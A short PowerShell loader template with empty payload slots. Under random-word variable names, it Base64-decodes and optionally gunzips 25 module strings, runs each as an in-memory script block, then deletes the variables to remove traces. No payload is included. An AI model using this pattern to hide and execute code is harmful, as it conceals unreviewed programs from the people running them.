#Requires -Version 2

$Overworked = ""
$Clitorises = ""
$Denigrates = ""
$Mizzenmast = ""
$Solidifies = ""
$Valparaiso = ""
$Stratagems = ""
$Coventries = ""
$Ostensibly = ""
$Absolutest = ""
$Hoodwinked = ""
$Shylockian = ""
$Clinically = ""
$Automotive = ""
$Personages = ""
$Associates = ""
$Reciprocal = ""
$Empowering = ""
$Sequential = ""
$Deodorized = ""
$Residences = ""
$Savageness = ""
$Tightropes = ""
$Cremations = ""
$Whispering = ""

$Modules = @($Overworked,$Clitorises,$Denigrates,$Mizzenmast,$Solidifies,$Valparaiso,$Stratagems,$Coventries,$Ostensibly,$Absolutest,$Hoodwinked,$Shylockian,$Clinically,$Automotive,$Personages,$Associates,$Reciprocal,$Empowering,$Sequential,$Deodorized,$Residences,$Savageness,$Tightropes,$Cremations,$Whispering)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Overworked","Clitorises","Denigrates","Mizzenmast","Solidifies","Valparaiso","Stratagems","Coventries","Ostensibly","Absolutest","Hoodwinked","Shylockian","Clinically","Automotive","Personages","Associates","Reciprocal","Empowering","Sequential","Deodorized","Residences","Savageness","Tightropes","Cremations","Whispering") | ForEach-Object { Remove-Variable -Name $_ }